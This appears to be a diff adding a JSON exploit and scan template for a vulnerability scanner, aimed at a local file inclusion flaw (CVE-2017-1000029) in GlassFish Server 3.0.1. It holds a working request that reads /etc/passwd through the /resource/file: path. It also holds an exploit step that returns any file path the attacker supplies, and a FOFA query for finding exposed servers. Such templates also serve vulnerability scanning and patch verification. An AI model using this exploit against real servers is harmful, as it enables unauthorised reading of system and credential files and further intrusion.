@@ -1,0 +1,144 @@
+{
+  "Name": "GlassFish Server Open Source Edition 3.01 Local File Inclusion",
+  "Description": "<p>Oracle GlassFish Server Open Source Edition is a set of open source versions of Oracle's (Oracle) company's server for building Java EE (server-side Java applications).<br></p><p>A local file inclusion vulnerability exists in Oracle GlassFish Server Open Source Edition 3.0.1 (build 22). An attacker could exploit this vulnerability to include arbitrary files on the server.<br></p>",
+  "Product": "GlassFish Server Open Source",
+  "Homepage": "http://www.oracle.com/",
+  "DisclosureDate": "2022-04-05",
+  "Author": "abszse",
+  "FofaQuery": "app=\"Oracle-Sun-GlassFish\"",
+  "GobyQuery": "app=\"Oracle-Sun-GlassFish\"",
+  "Level": "2",
+  "Impact": "<p>A local file inclusion vulnerability exists in Oracle GlassFish Server Open Source Edition 3.0.1 (build 22). An attacker could exploit this vulnerability to include arbitrary files on the server.<br></p>",
+  "Recommendation": "<p>Pay attention to the official website update in time: <a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
+  "References": [
+    "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18784"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "/etc/passwd/",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/resource/file%3a///etc/passwd/",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "regex",
+            "value": "root:(.*?):0:0:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/resource/file%3a//{{{cmd}}}",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody||"
+      ]
+    }
+  ],
+  "Tags": [
+    "Local File Inclusion"
+  ],
+  "VulType": [
+    "Local File Inclusion"
+  ],
+  "CVEIDs": [
+    "CVE-2017-1000029"
+  ],
+  "CNNVD": [
+    "CNNVD-201707-830"
+  ],
+  "CNVD": [
+    "CNVD-2017-27303"
+  ],
+  "CVSSScore": "7.5",
+  "Translation": {
+    "CN": {
+      "Name": "GlassFish 应用服务器 3.01 版本本地文件包含漏洞",
+      "Product": "GlassFish 应用服务器",
+      "Description": "<p>Oracle GlassFish Server Open Source Edition是美国甲骨文（Oracle）公司的一套开源版本的用于构建Java EE（服务器端Java应用程序）的服务器。<br></p><p>Oracle GlassFish Server Open Source Edition 3.0.1 (build 22)版本中存在本地文件包含漏洞。攻击者可利用该漏洞包含服务器上的任意文件。<br></p>",
+      "Recommendation": "<p>及时关注官网更新：<a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
+      "Impact": "<p>Oracle GlassFish Server Open Source Edition 3.0.1 (build 22)版本中存在本地文件包含漏洞。攻击者可利用该漏洞包含服务器上的任意文件。<br></p>",
+      "VulType": [
+        "本地⽂件包含"
+      ],
+      "Tags": [
+        "本地⽂件包含"
+      ]
+    },
+    "EN": {
+      "Name": "GlassFish Server Open Source Edition 3.01 Local File Inclusion",
+      "Product": "GlassFish Server Open Source",
+      "Description": "<p>Oracle GlassFish Server Open Source Edition is a set of open source versions of Oracle's (Oracle) company's server for building Java EE (server-side Java applications).<br></p><p>A local file inclusion vulnerability exists in Oracle GlassFish Server Open Source Edition 3.0.1 (build 22). An attacker could exploit this vulnerability to include arbitrary files on the server.<br></p>",
+      "Recommendation": "<p>Pay attention to the official website update in time: <a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
+      "Impact": "<p>A local file inclusion vulnerability exists in Oracle GlassFish Server Open Source Edition 3.0.1 (build 22). An attacker could exploit this vulnerability to include arbitrary files on the server.<br></p>",
+      "VulType": [
+        "Local File Inclusion"
+      ],
+      "Tags": [
+        "Local File Inclusion"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
